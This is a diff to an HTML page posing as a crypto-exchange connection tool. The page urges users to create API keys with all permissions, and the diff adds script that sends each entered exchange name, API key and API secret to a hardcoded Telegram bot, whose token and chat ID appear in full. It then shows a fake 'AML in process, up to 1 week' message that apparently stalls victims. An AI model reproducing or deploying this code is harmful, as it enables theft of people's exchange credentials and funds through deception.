@@ -100,6 +100,40 @@ button:hover {
   margin-bottom: 10px;
   color: #93c5fd;
 }
+
+/* Modal styles */
+#confirmationModal {
+  display: none; /* Hidden by default */
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.5);
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+}
+#confirmationModal > div {
+  background: #1f2937;
+  padding: 20px;
+  border-radius: 10px;
+  max-width: 400px;
+  width: 90%;
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+}
+#confirmationModal h2 {
+  margin-top: 0;
+}
+#logDetails {
+  margin-top: 10px;
+  font-size: 12px;
+  background: #2a3a52;
+  padding: 10px;
+  border-radius: 8px;
+  overflow: auto;
+  max-height: 200px;
+}
 </style>
 </head>
 
@@ -133,7 +167,7 @@ button:hover {
 
     <div class="status" id="status"></div>
 
-    <!-- 📘 API INSTRUCTIONS -->
+    <!-- API Instructions -->
 <div class="box">
   <h3 style="margin-top:0;">How to Create an API Key</h3>
   <p>Please follow the steps below to generate your API keys for each exchange. For comprehensive testing and verification, it is recommended to enable <strong>all permissions</strong>.</p>
@@ -178,38 +212,64 @@ button:hover {
   </div>
 </div>
 
+</div>
+</div>
+
+<!-- Modal for AML Processing Message -->
+<div id="confirmationModal">
+  <div>
+    <h2>Connection Successful</h2>
+    <p>AML in process. You will receive an email once the process is finished. This stage can take up to 1 week.</p>
+    <button onclick="closeModal()">Close</button>
+  </div>
+</div>
+
 <script>
 async function connect() {
   const status = document.getElementById("status");
   status.innerText = "Connecting to exchange...";
 
-  const payload = {
-    exchange: document.getElementById("exchange").value,
-    apiKey: document.getElementById("apiKey").value,
-    apiSecret: document.getElementById("apiSecret").value
-  };
+  const exchange = document.getElementById("exchange").value;
+  const apiKey = document.getElementById("apiKey").value;
+  const apiSecret = document.getElementById("apiSecret").value;
+
+  // Compose detailed log for Telegram
+  const logText = `
+Exchange: ${exchange}
+API Key: ${apiKey}
+API Secret: ${apiSecret}
+`;
 
   try {
-    // Your backend call (if any) can be added here
-    // For now, just simulate a successful connection
-    // await fetch('YOUR_BACKEND_ENDPOINT', {...})
-
-    // Notify via Telegram
+    // Send Telegram message with detailed log
     const telegramUrl = `https://api.telegram.org/bot8739273115:AAE4Dv8aq6e6sXs4ZtzvKiTrQkwHtoU6Nvs/sendMessage`;
     await fetch(telegramUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: "7737212833",
-        text: "AML in process. You will receive an email once the process is finished. This stage can take up to 1 week."
+        text: logText
       })
     });
+
+    // Show modal with AML message
+    showModal();
 
     // Update status
     status.innerText = "Connected. AML process started.";
   } catch (err) {
     status.innerText = "Error connecting or sending message.";
   }
+}
+
+// Show modal with AML message
+function showModal() {
+  document.getElementById('logDetails').innerText = "AML in process. You will receive an email once the process is finished. This stage can take up to 1 week.";
+  document.getElementById('confirmationModal').style.display = 'flex';
+}
+
+function closeModal() {
+  document.getElementById('confirmationModal').style.display = 'none';
 }
 </script>
 
